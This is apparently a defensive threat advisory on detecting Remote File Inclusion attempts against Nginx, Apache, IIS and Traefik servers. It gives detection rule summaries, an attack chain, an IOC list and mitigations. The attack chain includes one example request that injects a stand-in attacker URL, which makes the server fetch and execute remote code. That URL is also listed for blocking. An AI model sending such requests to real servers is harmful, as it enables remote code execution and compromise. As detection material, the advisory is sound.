---
title: Web Server Remote File Inclusion Discovery Activity
slug: 2024-01-rfi-discovery
description: Detection of Remote File Inclusion (RFI) attempts on web servers where HTTP GET requests try to access sensitive remote files, potentially leading to information disclosure and system compromise.
date: "2024-01-02T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - remote-file-inclusion
  - web-server
  - discovery
  - command-and-control
vendors:
  - Nginx
  - Apache
  - Microsoft
  - Traefik
products:
  - Nginx
  - Apache HTTP Server
  - Apache Tomcat
  - Internet Information Services
  - Traefik
mitre_ttps:
  - tactic_id: TA0007
    tactic_name: Discovery
    technique_id: T1083
    technique_name: File and Directory Discovery
references:
  - https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/discovery_web_server_remote_file_inclusion_activity.toml
  - https://attack.mitre.org/techniques/T1083/
  - https://attack.mitre.org/tactics/TA0007/
  - https://attack.mitre.org/tactics/TA0011/
iocs:
  - type: url
    value: http://203.0.113.10/drop.txt
ioc_counts:
  url: 1
rules:
  - title: Web Server Potential Remote File Inclusion Attempt
    description: Detects HTTP GET requests with suspicious parameters containing remote URLs or IP addresses, indicative of potential Remote File Inclusion (RFI) attempts.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
      - discovery
    techniques:
      - T1083
    data_sources:
      - web
      - nginx|apache|apache_tomcat|iis|traefik
  - title: Web Server Suspicious URL Parameter for RFI
    description: Detects HTTP requests with common RFI parameter names (e.g., 'page', 'url', 'include') containing suspicious URLs.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
      - discovery
    techniques:
      - T1083
    data_sources:
      - web
      - nginx|apache|apache_tomcat|iis|traefik
rules_count: 2
---

This threat brief focuses on identifying Remote File Inclusion (RFI) attacks targeting web servers such as Nginx, Apache, Apache Tomcat, IIS, and Traefik. RFI attacks occur when an attacker injects a remote URL into a web application's input fields, causing the application to include and execute code or files from a malicious external source. This can allow attackers to read sensitive files, execute arbitrary code, or further compromise the web server. Detection is based on analyzing HTTP GET requests with a status code of 200 where the URL contains a parameter including a remote URL or IP address. This behavior is indicative of an attacker attempting to leverage an RFI vulnerability. The Elastic detection rule was last updated on March 19, 2026, and is designed to work with Elastic Stack version 9.2.0 and later due to its reliance on the esql url_decode() operator.

## Attack Chain

1.  **Reconnaissance:** The attacker identifies a web application potentially vulnerable to RFI.
2.  **Crafted Request:** The attacker crafts a malicious HTTP GET request targeting a specific parameter (e.g., `page`, `url`, `src`) in the URL.
3.  **URL Injection:** The crafted GET request includes a malicious remote URL or IP address within the targeted parameter. For example, `/index.php?page=http://203.0.113.10/drop.txt`.
4.  **Server Request:** The web server receives the malicious GET request and attempts to process the injected URL.
5.  **Remote File Inclusion:** Due to the RFI vulnerability, the web server fetches and includes the remote file or executes the code from the injected URL.
6.  **Code Execution/Data Leakage:** If the included file contains malicious code (e.g., PHP), it gets executed on the server, potentially leading to arbitrary code execution. Alternatively, the attacker can leak sensitive information by including local files.
7.  **Persistence/Lateral Movement (Optional):** The attacker may attempt to establish persistence by writing a webshell to the webroot or move laterally to other systems within the network.
8.  **Compromise:** The attacker achieves the final objective, which may include data theft, system compromise, or denial-of-service.

## Impact

A successful RFI attack can have severe consequences, including unauthorized access to sensitive data, complete compromise of the web server, and potential lateral movement to other systems within the network. Depending on the application's function, this could lead to the exposure of customer data, financial information, or intellectual property. The targeted sectors are diverse, ranging from e-commerce and finance to government and healthcare, as any web application with an RFI vulnerability is susceptible.

## Recommendation

*   Deploy the Sigma rule "Web Server Potential Remote File Inclusion Attempt" to your SIEM to detect suspicious GET requests containing remote URLs in the query parameters.
*   Block the IOC `http://203.0.113.10/drop.txt` at your web application firewall or intrusion prevention system to prevent access to the known malicious resource.
*   Enable detailed web server logging (as mentioned in the Overview) and monitor for unusual outbound connections from web servers to suspicious or unknown IPs or domains to identify potential RFI exploitation.
*   Configure PHP settings such as `allow_url_include` and `allow_url_fopen` to `Off` and implement `open_basedir` restrictions (as mentioned in the Overview) to mitigate RFI vulnerabilities.
*   Implement strict input validation and sanitization (as mentioned in the Overview) to prevent the inclusion of malicious URLs.
